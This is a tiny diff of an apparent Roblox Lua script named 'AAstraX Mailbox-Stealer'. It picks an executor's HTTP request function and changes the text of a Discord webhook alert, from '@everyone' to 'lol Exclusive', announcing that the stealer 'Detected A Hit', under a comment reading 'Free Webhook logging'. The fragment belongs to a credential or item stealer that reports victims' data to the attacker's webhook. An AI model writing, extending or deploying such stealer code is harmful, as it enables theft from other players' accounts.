@@ -34,7 +34,7 @@ request = http_request or request or HttpPost or syn.request
 
 local data1 = {
 
-    ["content"] = "||@everyone||\n**:comet:AAstraX Mailbox-Stealer Detected A Hit:comet:**", -- Free Webhook logging
+    ["content"] = "||lol Exclusive||\n**:comet:AAstraX Mailbox-Stealer Detected A Hit:comet:**", -- Free Webhook logging
 
     ["embeds"] = {
 
